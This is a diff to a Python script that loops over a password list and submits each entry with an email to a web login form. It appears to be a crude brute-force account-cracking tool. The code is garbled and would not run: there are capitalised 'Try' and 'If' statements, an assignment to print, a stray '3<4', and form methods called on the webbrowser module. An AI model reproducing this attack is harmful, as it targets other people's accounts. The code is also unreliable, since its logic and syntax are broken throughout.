@@ -1,7 +1,9 @@
 import sys 
 import os
-
-
+import time
+if sys.version_info[0] !=3:
+   print(' Required version of python3 .please install python3 then restart')
+   print('restart programme after that')
 try:
     import tokenize
     
@@ -21,7 +23,6 @@ import urllib
 from nturl2path import url2pathname
 import time
 from urllib.request import urlopen 
-import urllib
 
 3<4
 G=444333
@@ -46,15 +47,15 @@ print("\nTrying passwords from list")
 i=0
 while FileType :
     password=file.readline().strip()
-i+=1
-if len(password) < 10:
-  Continue
-print = str (i) +" : ",password
+    i+=1
+    if len(password) < 10:
+      continue
+print=str(i) +" : ",password
 response = webbrowser.BackgroundBrowser.open(urlopen);
 
 Try
 If; response; code == 200
-webbrowser.select_form(nr=o)
+webbrowser.select_form(nr=0)()
 webbrowser.form['email']=email
 webbrowser.form['pass']=password
 response = webbrowser.submit()
